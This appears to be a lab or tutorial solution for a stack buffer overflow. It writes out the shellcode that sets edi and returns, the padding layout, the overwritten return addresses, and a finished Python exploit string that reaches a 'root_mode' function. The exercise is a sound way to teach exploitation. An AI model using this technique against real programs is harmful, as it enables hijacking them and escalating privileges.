There's actually a couple ways to solve this one, but I really like the solution
that takes advantage of `ret` reading the very next thing on the stack as if it
was a return pointer. You might also solve this with a `jmp` instruction (but it
needs to be relative to the new execution pointer on the stack, so it's a bit
more annoying).


First thing that goes on our stack is our assembly code. As I mentioned in Hint
4, mine was:
```
mov edi,0x41424344
ret
```

That assembles to (in x64)
```
bf 44 43 42 41
c3
```

What this will do is place the value `0x41424344` into the `%edi` register and
then jump to the address currently on top of the stack. Since the function we're
calling expects its first argument to be in `edi`, if the address on the top of
the stack happens to go to the _start_ of that function, we've effectively
"called it" with the argument `0x41424344`.

Note that our assembly is 6 bytes long. We have another 14 bytes until we hit
our return pointer (6 more bytes in the username buffer and 8 bytes for the
frame pointer).  We can put whatever we want there. I'll put nulls (`\x00`).

Now we need to put the address of username, which in my case was
`0x7ffeefbff854`. This is *not consistent* across compiles, so yours is almost
certainly slightly different.

Finally, we put the address of the `root_mode` call, which we find using
`objdump` just like we did in example 2. Mine was `0x100000dc0`. Yours is quite
likely the same; this appears to be pretty consistent across compiles, but do
double check. Remember that once our assembly code calls `ret`, this will be the
top of the stack.

Putting it all together, we can make an exploit string like this:
```python2
exploit_string = "\xbf\x44\x43\x42\x41\xc3"
exploit_string += '\x00' * 14
exploit_string += '\x54\xf8\xbf\xef\xfe\x7f\x00\x00'
exploit_string += '\xc0\x0d\x00\x00\x01\x00\x00\x00'
print exploit_string
```

Note that I broke it out for clarity, but it's fine as a one-liner fed back into
our socket too.
